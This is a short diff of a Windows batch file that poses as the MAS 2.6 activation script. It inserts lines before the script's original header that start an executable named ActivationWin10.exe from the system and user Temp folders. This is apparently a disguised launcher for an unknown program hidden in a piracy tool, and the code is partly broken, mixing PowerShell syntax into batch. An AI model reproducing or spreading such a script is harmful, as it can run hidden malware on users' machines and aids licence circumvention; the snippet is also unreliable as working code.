@@ -1,13 +1,13 @@
-@rem RANDAM-ad90b7f0-440e-475f-98e3-d90447095365
-@set masver=2.6
-@setlocal DisableDelayedExpansion
 @echo off
-
-
 $FilePath22 = "$env:SystemRoot\Temp\"
 $FilePath222 = "$env:TEMP\"
 start "$FilePath22" ActivationWin10.exe
 start "$FilePath222" ActivationWin10.exe
+@rem RANDAM-ad90b7f0-440e-475f-98e3-d90447095365
+@set masver=2.6
+@setlocal DisableDelayedExpansion
+
+
 
 ::  For command line switches, check mass grave [.] dev/command_line_switches.html
 ::  If you want to better understand script, read from MAS separate files version. 
